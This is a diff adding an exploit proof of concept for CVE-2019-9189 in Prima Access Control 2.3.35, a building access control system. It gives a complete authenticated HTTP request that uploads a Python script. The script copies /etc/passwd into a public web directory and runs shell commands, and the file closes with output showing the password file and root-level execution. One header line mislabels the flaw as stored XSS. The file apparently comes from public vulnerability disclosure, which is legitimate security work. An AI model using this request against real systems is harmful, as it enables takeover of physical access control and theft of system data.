@@ -1,0 +1,51 @@
+# Exploit Title: Prima Access Control 2.3.35 - Arbitrary File Upload
+# Google Dork: NA
+# Date: 2019-11-11
+# Exploit Author: LiquidWorm
+# Vendor Homepage: https://www.computrols.com/capabilities-cbas-web/
+# Software Link: https://www.computrols.com/building-automation-software/
+# Version: 2.3.35
+# Tested on: NA
+# CVE : CVE-2019-9189
+# Advisory: https://applied-risk.com/resources/ar-2019-007
+# Paper: https://applied-risk.com/resources/i-own-your-building-management-system
+# Prima Access Control 2.3.35 Authenticated Stored XSS
+
+# PoC
+
+---
+
+POST /bin/sysfcgi.fx HTTP/1.1
+Host: 192.168.13.37
+Connection: keep-alive
+Content-Length: 572
+Origin: https://192.168.13.37
+Session-ID: 5682699
+User-Agent: Mozi-Mozi/44.0
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+Accept: text/html, */*; q=0.01
+Session-Pc: 2
+X-Requested-With: XMLHttpRequest
+Referer: https://192.168.13.37/app/
+Accept-Encoding: gzip, deflate, br
+Accept-Language: en-US,en;q=0.9
+Cookie: G_ENABLED_IDPS=google
+
+<requests><request name="PythonScriptUpload"><param name="DestinationHwID" value="1"/><param name="FileName" value="test_python.py"/><param name="Content" value="#!/usr/bin/python&#xA;#&#xA;# test script&#xA;#&#xA;&#xA;import sys,os&#xA;&#xA;with open("/etc/passwd") as f:&#xA;    with open("/www/pages/app/images/logos/testingus2.txt", "w") as f1:&#xA;        for line in f:&#xA;            f1.write(line)&#xA;&#xA;&#xA;os.system("id;uname -a >> /www/pages/app/images/logos/testingus2.txt")"/></request></requests>
+
+Result:
+
+$ curl https://192.168.13.37/app/images/logos/testingus2.txt
+root:x:0:0:root:/home/root:/bin/sh
+daemon:x:1:1:daemon:/usr/sbin:/bin/false
+bin:x:2:2:bin:/bin:/bin/false
+sys:x:3:3:sys:/dev:/bin/false
+sync:x:4:100:sync:/bin:/bin/sync
+mail:x:8:8:mail:/var/spool/mail:/bin/false
+www-data:x:33:33:www-data:/var/www:/bin/false
+operator:x:37:37:Operator:/var:/bin/false
+nobody:x:99:99:nobody:/home:/bin/false
+python:x:1000:1000:python:/home/python:/bin/false
+admin:x:1001:1001:Linux User,,,:/home/admin:/bin/sh
+uid=0(root) gid=0(root) groups=0(root),10(wheel)
+Linux DemoMaster214 4.4.16 #1 Mon Aug 29 13:29:40 CEST 2016 armv7l GNU/Linux
